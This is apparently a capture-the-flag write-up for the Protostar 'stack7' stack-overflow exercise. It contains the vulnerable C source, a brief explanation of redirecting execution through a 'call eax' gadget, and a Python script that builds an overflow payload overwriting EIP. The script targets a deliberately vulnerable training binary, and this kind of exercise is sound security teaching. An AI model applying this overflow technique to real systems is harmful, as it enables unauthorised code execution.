
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                      Hints
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Stack6 introduces return to .text to gain code execution.

The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

This level is at /opt/protostar/bin/stack7


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                          Source Code : 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();



}


Concept:
#######################

Well, Its very unique case. here, as we know that we can't overwrite return address start from 0xb.......
So, what we will do is, find a special and suitable instruction from source and points our EIP to it....

For Example:
          At the end of getpath function, To execute strdup operation our system will copy all codes into eax
registers. so, we just need to find call eax instruction in source code and then point our eip to it.

To Find Instruction Use:

objdump -S stack7 | grep "call"



0         42        46          76         80     84
===================================================
|  'a'*42 | '\xcc'*4 | '\x90'*30 | '\xcc'*4 | EIP |
===================================================


Exploit:


#!/usr/bin/python
import struct


tbuf = 76
buf = "\x41"*42+'\xcc'*4+'\x90'*30

ebp = "\xcc"*4



eip = struct.pack("I",0x80485eb)

payload = buf+ ebp + eip + '\xcc'*4


print payload



